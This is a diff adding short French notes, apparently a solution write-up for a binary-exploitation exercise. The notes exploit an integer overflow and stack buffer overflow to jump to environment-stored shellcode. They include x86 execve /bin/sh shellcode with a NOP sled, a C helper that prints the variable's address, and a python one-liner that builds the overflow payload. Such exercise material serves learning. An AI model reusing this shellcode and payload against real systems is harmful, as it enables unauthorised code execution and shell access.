@@ -1,0 +1,16 @@
+j'envoi un int overflow = a - 1 (xffffffff); puis je remplie le buffer jusqua eip, jennvoi ladresse de ma variable d'environnement contenant mon shellcode. grace a mon pprogramme d avant (decalage de 2 par rapoort a gdb)
+
+export SHELLCODE=`python -c 'import sys; sys.stdout.write("\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\x04\x05\x04\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80")'`
+
+j'export mon shellcode
+
+avec mon programme je recupere l'adresse 
+#include <stdio.h>
+#include <stdlib.h>
+
+int		main(void)
+{
+		return (printf("\n[%p]\n", getenv("SHELLCODE")));
+}
+
+echo -n `python -c 'print("\xff\xff\xff\xff" + "/" + "A" * 140 + "\xb8\xfd\xff\xbf")'` > /tmp/tte
